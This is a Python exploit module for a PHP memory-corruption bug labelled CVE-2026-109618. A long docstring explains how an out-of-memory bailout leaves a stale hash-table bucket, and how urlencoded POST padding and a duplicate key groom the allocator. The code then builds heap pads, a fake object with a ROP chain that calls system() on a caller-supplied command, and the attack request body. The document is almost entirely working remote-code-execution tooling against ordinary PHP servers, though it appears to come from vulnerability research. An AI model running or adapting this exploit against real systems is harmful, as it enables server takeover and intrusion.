#!/usr/bin/env python3
# INDEX: urlencoded $_POST OOM-abandoned-bucket arm: memshift OOM-table steer + bin-28 dup-key arData reclaim | cli apache fpm
# Ported from the-cookie-bakery/actual-php2shell (exploits/cve-2026-109618-oom/rce.py).
"""urlencoded-$_POST route for the CVE-2026-109618 OOM-abandoned HashTable bucket.

Same corruption channel as the multipart $_FILES seats (bugs/stale_bucket_groom_crash,
primitives/groom/stale_bucket_value_seat): `_zend_hash_str_add_or_update_i` does
`idx = ht->nNumUsed++` and then `p->key = zend_string_init(...)`; if that key copy
hits memory_limit it bails with the bucket counted but key/val UNWRITTEN, and
request-shutdown's `zend_array_destroy` walks the stale `val`. This arms it over
urlencoded `$_POST` (no file upload), with two grooms that make the stale bucket
both WALKED and attacker-controlled:

(a) OOM-table steering. `a[<large>][c]=v` registers `<large>` into `$_POST["a"]`
    via `zend_symtable_str_update_ind`; a repeated `a[...]` field triggers
    `SEPARATE_ARRAY` (`GC_REFCOUNT>1 -> zend_array_dup`, Zend/zend_types.h:1561),
    so two arrays exist and fast-shutdown walks only the live dup. A leading
    `memshift=<~40 KB>` pad shifts WHEN the OOM fires, steering it onto the walked
    copy ($_POST["a"]) instead of the discarded separated copy.

(b) bin-28 arData reclaim. The walked array grows 32->64 buckets; HT_SIZE(64) =
    64*32 + 128*4 = 2560 = ZendMM bin 28. A `pad=<2528 B>` field makes BOTH its
    `estrndup` temp (2529) and its retained `ZVAL_STRINGL_FAST` copy (2560) land
    in bin 28; a DUPLICATE `pad=x` key DTORs the retained copy, freeing a second
    distinct bin-28 slot so the 32->64 resize reuses attacker bytes as arData.
    The surviving arData tail (buckets 46..63, pad off >= TAIL_MIN_PAD_OFF) carries
    a caller-supplied payload; the unwritten OOM bucket's 16-byte val (VAL_PAD_OFF)
    is pointed into it.

Payload-agnostic / ASLR-parametric: the finisher bytes (fake object graph, ROP)
and all addresses are caller inputs, so the groom itself is address-free. The
grooming (memshift, padlen, dup key) needs NO leak; only the payload CONTENTS
need leaked bases (fake_object_payload() takes them as args).

Correctness note vs upstream: upstream posts the raw pad bytes, which only parses
because its hardcoded addresses contain no `& = + % \\0`; here the pad is
percent-encoded so its DECODED length stays PADLEN (the bin-28 arithmetic) for an
arbitrary payload.

Stage: THEORIZED on our labs. Mechanism + bin-28/offset arithmetic source-confirmed
(php-8.5.11); upstream demonstrates end-to-end RCE ASLR-off. NOT reproduced on our
labs: the memshift that lands the OOM on the walked copy is per-target (sweep, as
the $_FILES seats do) and the finisher needs an address leak (same tier as our
other chains). Distinct from the owned $_FILES seats (urlencoded delivery; bin-28
64-bucket reclaim vs bin-320 8-bucket).

API:
    PADLEN, BIN28_SIZE, VAL_PAD_OFF, TAIL_MIN_PAD_OFF  - constants / geometry
    build_pad(tail, val, fill, padlen)  -> PADLEN decoded bytes (the bin-28 value)
    fake_object_payload(...)            -> (tail dict, val) demo-style finisher
    post_body(pad, nkeys, memshift, keylen, split)  -> urlencoded wire bytes
"""
from __future__ import annotations

import struct
from urllib.parse import quote_from_bytes

# bin-28 geometry (Zend/zend_alloc_sizes.h size classes; ABI-stable across 8.x).
BIN28_SIZE = 2560          # HT_SIZE for nTableSize=64 (64*32 + 128*4); emalloc(2049..2560) -> bin 28
PADLEN = 2528              # decoded value len: estrndup A=2529 and ZVAL_STRINGL_FAST B=2553 both bin 28
PAD_HEADER = 24            # pad byte i == arData raw-block byte (i + PAD_HEADER) (zend_string header)

# Offsets WITHIN the pad value (upstream-calibrated defaults; the exact unwritten
# index tracks nNumUsed at OOM, so re-measure per memshift).
VAL_PAD_OFF = 1928         # unwritten OOM bucket val (16-byte zval): raw 1952 = bucket 45
TAIL_MIN_PAD_OFF = 1960    # first surviving tail byte: raw 1984 = bucket 46 (rehash-safe)


def _bin28(nbytes: int) -> bool:
    return 2049 <= nbytes <= BIN28_SIZE


def build_pad(tail: dict[int, bytes] | None = None, val: bytes = b"",
              fill: bytes = b"P", padlen: int = PADLEN) -> bytes:
    """A `padlen`-byte bin-28 value: `fill` background, `val` (<=16 B zval) at
    VAL_PAD_OFF, and each `tail` {pad_offset: bytes} placed in the arData tail.
    All tail offsets must be >= TAIL_MIN_PAD_OFF (buckets 46..63 survive rehash)."""
    pad = bytearray((fill * (padlen // len(fill) + 1))[:padlen])
    for off, data in (tail or {}).items():
        if off < TAIL_MIN_PAD_OFF:
            raise ValueError(f"tail payload at {off} < TAIL_MIN_PAD_OFF {TAIL_MIN_PAD_OFF} "
                             f"(would be rewritten by zend_hash_rehash)")
        if off + len(data) > padlen:
            raise ValueError(f"tail payload at {off} overflows padlen {padlen}")
        pad[off:off + len(data)] = data
    if val:
        if len(val) > 16:
            raise ValueError("val is a 16-byte zval")
        pad[VAL_PAD_OFF:VAL_PAD_OFF + len(val)] = val
    return bytes(pad)


def fake_object_payload(block_base_B: int, pivot: int, pop_rdi_ret: int, ret: int,
                        system: int, cmd: bytes, handlers_off: int = 2000,
                        object_off: int = 2048, cmd_off: int = 2200
                        ) -> tuple[dict[int, bytes], bytes]:
    """Upstream demo finisher (addresses are caller inputs -> ASLR-parametric):
    fake zend_object_handlers (free_obj=pivot) + fake zend_object + a jump_fcontext
    pivot ROP (pop rdi; ret; ret(align); system) + the command string, laid out in
    the arData tail. `block_base_B` is the leaked arData raw-block base
    (= b150->arData - HT_HASH_SIZE(64)=512); pad byte i lives at B + PAD_HEADER + i.
    Returns (tail dict for build_pad, 16-byte IS_OBJECT val)."""
    IS_OBJECT = 8
    def u64(x): return struct.pack("<Q", x)
    def u32(x): return struct.pack("<I", x)

    base = block_base_B + PAD_HEADER
    handlers_addr = base + handlers_off
    object_addr = base + object_off
    cmd_addr = base + cmd_off

    handlers = bytearray(24)
    handlers[0:8] = u64(0)            # offset (efree base)
    handlers[8:16] = u64(pivot)       # free_obj
    handlers[16:24] = u64(ret)        # dtor_obj

    o = bytearray(0x60)
    o[0x00:0x04] = u32(1)             # gc.refcount (doubles as valid MXCSR)
    o[0x04:0x08] = u32(IS_OBJECT)     # gc.type_info (valid FCW)
    o[0x18:0x20] = u64(handlers_addr)  # handlers
    o[0x40:0x48] = u64(pop_rdi_ret)   # first gadget (restored r8)
    o[0x48:0x50] = u64(cmd_addr)      # rdi = &command
    o[0x50:0x58] = u64(ret)           # stack align (movaps in __libc_system)
    o[0x58:0x60] = u64(system)        # rip

    tail = {handlers_off: bytes(handlers), object_off: bytes(o),
            cmd_off: (cmd if isinstance(cmd, bytes) else cmd.encode()) + b"\x00"}
    val = u64(object_addr) + u32(IS_OBJECT | 0x100) + u32(0)  # IS_OBJECT|refcounted
    return tail, val


def _enc(b: bytes) -> bytes:
    """Percent-encode so the DECODED length == len(b) (preserves bin-28 sizing)."""
    return quote_from_bytes(b, safe=b"").encode()


def post_body(pad: bytes, nkeys: int = 60, memshift: int = 40000,
              keylen: int = 80000, split: int | None = None) -> bytes:
    """urlencoded body: `memshift` steer pad -> first half of `nkeys`
    a[<keylen key>][c]=v -> pad=<pad> -> pad=x (dup key, frees the bin-28 copy) ->
    second half. The resizes cross between the two halves, so the dup pad sits
    between them. `pad` is percent-encoded; its decoded length must be bin-28."""
    if not _bin28(len(pad)):
        raise ValueError(f"pad decoded len {len(pad)} not in bin 28 (2049..{BIN28_SIZE})")
    if split is None:
        split = nkeys // 2

    def key(i: int) -> bytes:
        return b"X" * (keylen - 16) + (b"%016d" % i)

    out = bytearray()
    out += b"memshift=" + (b"M" * memshift) + b"&"
    for i in range(split):
        out += b"a[" + key(i) + b"][c]=v&"
    out += b"pad=" + _enc(pad) + b"&"
    out += b"pad=x&"
    for i in range(split, nkeys):
        out += b"a[" + key(i) + b"][c]=v&"
    return bytes(out[:-1])  # drop trailing &
